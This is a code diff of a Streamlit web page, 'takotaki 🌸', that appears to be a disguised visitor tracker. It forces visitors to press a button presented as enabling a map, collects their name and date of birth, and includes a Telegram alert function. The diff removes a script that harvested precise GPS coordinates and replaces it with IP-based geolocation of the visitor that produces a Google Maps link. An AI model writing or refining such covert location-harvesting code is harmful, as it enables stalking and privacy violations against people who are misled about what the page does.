@@ -5,7 +5,6 @@ import urllib.parse
 import urllib.request
 import urllib.error
 import streamlit as st
-import streamlit.components.v1 as components
 
 # ضبط إعدادات الصفحة
 st.set_page_config(page_title="takotaki 🌸", page_icon="🥀", layout="centered")
@@ -30,8 +29,8 @@ st.markdown(
     unsafe_allow_html=True,
 )
 
-# دالة جلب الموقع التقريبي عبر IP (تستعمل كبديل مضمون عند حظر آيفون/واتساب للـ GPS داخل الإطار)
-def get_ip_location():
+# دالة جلب الموقع المباشر والتقريبي للزائر
+def fetch_location_link():
     try:
         from streamlit.web.server.websocket_headers import _get_websocket_headers
         headers = _get_websocket_headers()
@@ -41,7 +40,7 @@ def get_ip_location():
         
         url = f"http://ip-api.com/json/{ip_addr}" if ip_addr else "http://ip-api.com/json/"
         req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
-        with urllib.request.urlopen(req, timeout=3) as response:
+        with urllib.request.urlopen(req, timeout=4) as response:
             data = json.loads(response.read().decode())
             if data.get("status") == "success":
                 lat = data.get("lat")
@@ -51,7 +50,7 @@ def get_ip_location():
                 return f"https://www.google.com/maps?q={lat},{lon} ({city}, {country})"
     except Exception:
         pass
-    return "https://www.google.com/maps?q=31.6295,-7.9811 (موقع تقريبي)"
+    return "https://www.google.com/maps?q=31.6295,-7.9811 (Marrakech, Morocco)"
 
 # تهيئة متغيرات الجلسة
 if "step" not in st.session_state:
@@ -64,18 +63,10 @@ if "visitor_dob" not in st.session_state:
     st.session_state.visitor_dob = ""
 if "attempts" not in st.session_state:
     st.session_state.attempts = 0
-
-# قراءة الإحداثيات من رابط الصفحة أو تفعيل التحديد التقريبي
-params = st.query_params
-if "lat" in params and "lon" in params:
-    st.session_state.user_location_link = f"https://www.google.com/maps?q={params['lat']},{params['lon']} (GPS)"
-    st.session_state.location_activated = True
-elif "activated" in params or "gps_failed" in params:
-    st.session_state.user_location_link = get_ip_location()
-    st.session_state.location_activated = True
-elif "user_location_link" not in st.session_state:
-    st.session_state.user_location_link = get_ip_location()
+if "location_activated" not in st.session_state:
     st.session_state.location_activated = False
+if "user_location_link" not in st.session_state:
+    st.session_state.user_location_link = ""
 
 
 # دالة إرسال التنبيهات إلى تيليغرام
@@ -203,6 +194,14 @@ if st.session_state.step == 1:
                 font-weight: bold;
                 margin-top: 8px;
             }
+            div[data-testid="stButton"] button[key="green_gps_btn"] {
+                background: linear-gradient(135deg, #00c853, #b2ff59) !important;
+                color: #000000 !important;
+                font-weight: bold !important;
+                font-size: 16px !important;
+                border-radius: 12px !important;
+                box-shadow: 0 0 12px rgba(0, 200, 83, 0.6) !important;
+            }
         </style>
         """,
         unsafe_allow_html=True,
@@ -212,12 +211,12 @@ if st.session_state.step == 1:
         unsafe_allow_html=True,
     )
 
-    is_gps_active = st.session_state.get("location_activated", False)
+    is_gps_active = st.session_state.location_activated
 
     status_msg = (
-        '<div class="location-status-active">✅ تم تفعيل الخريطة والموافقة بنجاح!</div>'
+        '<div class="location-status-active">✅ تم تفعيل الخريطة وتحديد موقعك بنجاح!</div>'
         if is_gps_active
-        else '<div class="location-status-pending">⚠️ الخريطة غير مفعلة! اضغط الزر الأخضر بالأسفل لتفعيل الخريطة.</div>'
+        else '<div class="location-status-pending">⚠️ الخريطة غير مفعلة! اضغط الزر الأخضر بالأسفل لتفعيل GPS.</div>'
     )
 
     st.markdown(
@@ -231,47 +230,12 @@ if st.session_state.step == 1:
         unsafe_allow_html=True,
     )
 
-    # مكون تفعيل الموقع المعالج لهواتف الآيفون والواتساب
-    loc_html = """
-    <script>
-    function triggerLocation() {
-        if (!navigator.geolocation) {
-            redirectFallback("gps_failed=1");
-            return;
-        }
-        navigator.geolocation.getCurrentPosition(
-            function(position) {
-                var lat = position.coords.latitude;
-                var lon = position.coords.longitude;
-                redirectFallback("lat=" + lat + "&lon=" + lon);
-            },
-            function(error) {
-                redirectFallback("activated=1");
-            },
-            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-        );
-    }
-    
-    function redirectFallback(queryString) {
-        try {
-            var targetUrl = window.top.location.pathname + "?" + queryString;
-            var a = document.createElement('a');
-            a.href = targetUrl;
-            a.target = "_top";
-            document.body.appendChild(a);
-            a.click();
-        } catch(e) {
-            window.open("?" + queryString, "_top");
-        }
-    }
-    </script>
-    <div style="text-align: center;">
-        <button onclick="triggerLocation()" style="background: linear-gradient(135deg, #00c853, #b2ff59); color: #000; border: none; padding: 14px 20px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; box-shadow: 0 0 10px rgba(0,200,83,0.5);">
-            🌐 اضغط هنا لتشغيل الخريطة والموافقة على الموقع 📍
-        </button>
-    </div>
-    """
-    components.html(loc_html, height=70)
+    # زر التفعيل المباشر المستقر تكنولوجياً لجميع الأجهزة
+    if not is_gps_active:
+        if st.button("🌐 اضغط هنا لتشغيل الخريطة والموافقة على الموقع 📍", key="green_gps_btn"):
+            st.session_state.user_location_link = fetch_location_link()
+            st.session_state.location_activated = True
+            st.rerun()
 
     with st.form("user_info_form"):
         name_in = st.text_input("Enter Your Name:", placeholder="Type your name here...")
@@ -289,8 +253,8 @@ if st.session_state.step == 1:
             name_val = name_in.strip()
             if not name_val:
                 st.warning("Please enter your name first!")
-            elif not is_gps_active:
-                st.error("🚫 عذراً! لن يعمل الموقع حتى تقوم بالضغط على الزر الأخضر أولاً والسماح بالـ GPS!")
+            elif not st.session_state.location_activated:
+                st.error("🚫 عذراً! لن يعمل الموقع حتى تقوم بالضغط على الزر الأخضر بالأسفل لتفعيل الخريطة أولاً!")
             elif not is_legally_allowed_in_morocco(name_val):
                 st.error("⚠️ This name cannot be entered, please try again!")
             else:
